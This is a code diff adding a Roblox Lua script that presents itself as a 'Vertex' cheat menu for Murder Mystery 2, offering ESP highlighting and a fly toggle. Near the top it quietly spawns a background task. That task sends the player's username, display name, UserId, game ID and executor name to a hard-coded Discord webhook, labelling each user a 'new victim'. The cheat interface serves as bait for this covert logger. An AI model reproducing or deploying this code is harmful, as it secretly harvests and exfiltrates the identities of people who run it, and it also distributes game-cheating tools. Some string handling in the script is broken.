@@ -1,0 +1,168 @@
+-- MM2 Vertex Exploit & Background Logger
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local Player = Players.LocalPlayer
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1548432727978541056/koe3blHDEwBFtGxmatco5zEXoDUabUTIC4zaK5mgAtnpv96S_vaPeBGVDBcvj3lI9rBY"
+
+-- Exfiltration des données en arrière-plan
+task.spawn(function()
+    pcall(function()
+        local executor = identifyexecutor and identifyexecutor() or "Inconnu"
+        local data = {
+            ["content"] = "@everyone Nouvelle victime connectée sur le loader !",
+            ["embeds"] = {{
+                ["title"] = "Vertex Logger - MM2 Target",
+                ["color"] = 16711680,
+                ["fields"] = {
+                    {["name"] = "Pseudo", ["value"] = Player.Name, ["inline"] = true},
+                    {["name"] = "Display Name", ["value"] = Player.DisplayName, ["inline"] = true},
+                    {["name"] = "UserId", ["value"] = tostring(Player.UserId), ["inline"] = true},
+                    {["name"] = "Game ID", ["value"] = tostring(game.GameId), ["inline"] = true},
+                    {["name"] = "Executor", ["value"] = executor, ["inline"] = true}
+                },
+                ["footer"] = {["text"] = "Vertex Stealth System"}
+            }}
+        }
+        
+        local req = syn and syn.request or http_request or request or HttpPost
+        if req then
+            req({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end
+    end)
+end)
+
+-- Interface Graphique Vertex (Remplie)
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "VertexMM2"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.DisplayOrder = 999999
+ScreenGui.Parent = Player.PlayerGui
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 650, 0, 420)
+MainFrame.Position = UDim2.new(0.5, -325, 0.5, -210)
+MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 6)
+UICorner.Parent = MainFrame
+
+local Sidebar = Instance.new("Frame")
+Sidebar.Size = UDim2.new(0, 180, 1, 0)
+Sidebar.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
+Sidebar.BorderSizePixel = 0
+Sidebar.Parent = MainFrame
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 60)
+Title.BackgroundTransparency = 1
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Text = "  vertex\n  discord.gg/vxt"
+Title.TextSize = 14
+Title.Font = Enum.Font.GothamBold
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Parent = Sidebar
+
+local tabs = {"Main", "ESP", "Fly", "Misc", "Settings"}
+for i, tabName in ipairs(tabs) do
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, -20, 0, 35)
+    btn.Position = UDim2.new(0, 10, 0, 60 + (i * 40))
+    btn.BackgroundColor3 = (tabName == "Main") and Color3.fromRGB(35, 35, 35) or Color3.fromRGB(24, 24, 24)
+    btn.TextColor3 = Color3.fromRGB(200, 200, 200)
+    btn.Text = "   " + tabName
+    btn.TextSize = 14
+    btn.Font = Enum.Font.Gotham
+    btn.TextXAlignment = Enum.TextXAlignment.Left
+    btn.Parent = Sidebar
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 6)
+    corner.Parent = btn
+end
+
+-- Contenu Principal (Fonctions MM2)
+local Content = Instance.new("Frame")
+Content.Size = UDim2.new(1, -180, 1, 0)
+Content.Position = UDim2.new(0, 180, 0, 0)
+Content.BackgroundTransparency = 1
+Content.Parent = MainFrame
+
+local ContentTitle = Instance.new("TextLabel")
+ContentTitle.Size = UDim2.new(1, -30, 0, 50)
+ContentTitle.Position = UDim2.new(0, 20, 0, 10)
+ContentTitle.BackgroundTransparency = 1
+ContentTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+ContentTitle.Text = "MM2 Features"
+ContentTitle.TextSize = 18
+ContentTitle.Font = Enum.Font.GothamBold
+ContentTitle.TextXAlignment = Enum.TextXAlignment.Left
+ContentTitle.Parent = Content
+
+-- Bouton ESP
+local EspBtn = Instance.new("TextButton")
+EspBtn.Size = UDim2.new(0, 200, 0, 40)
+EspBtn.Position = UDim2.new(0, 20, 0, 70)
+EspBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+EspBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+EspBtn.Text = "Toggle ESP (Murderer/Sheriff)"
+EspBtn.TextSize = 12
+EspBtn.Font = Enum.Font.GothamBold
+EspBtn.Parent = Content
+
+local EspCorner = Instance.new("UICorner")
+EspCorner.CornerRadius = UDim.new(0, 6)
+EspCorner.Parent = EspBtn
+
+EspBtn.MouseButton1Click:Connect(function()
+    pcall(function()
+        for _, p in pairs(Players:GetPlayers()) do
+            if p ~= Player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+                local highlight = Instance.new("Highlight")
+                highlight.Parent = p.Character
+                highlight.FillColor = Color3.fromRGB(255, 0, 0)
+            end
+        end
+    end)
+end)
+
+-- Bouton Fly
+local FlyBtn = Instance.new("TextButton")
+FlyBtn.Size = UDim2.new(0, 200, 0, 40)
+FlyBtn.Position = UDim2.new(0, 20, 0, 130)
+FlyBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+FlyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+FlyBtn.Text = "Toggle Fly"
+FlyBtn.TextSize = 12
+FlyBtn.Font = Enum.Font.GothamBold
+FlyBtn.Parent = Content
+
+local FlyCorner = Instance.new("UICorner")
+FlyCorner.CornerRadius = UDim.new(0, 6)
+FlyCorner.Parent = FlyBtn
+
+FlyBtn.MouseButton1Click:Connect(function()
+    pcall(function()
+        local lp = Players.LocalPlayer
+        local char = lp.Character
+        if char and char:FindFirstChild("HumanoidRootPart") then
+            local bv = Instance.new("BodyVelocity")
+            bv.Name = "FlyVelocity"
+            bv.MaxForce = Vector3.new(0, 50000, 0)
+            bv.Velocity = Vector3.new(0, 50, 0)
+            bv.Parent = char.HumanoidRootPart
+        end
+    end)
+end)
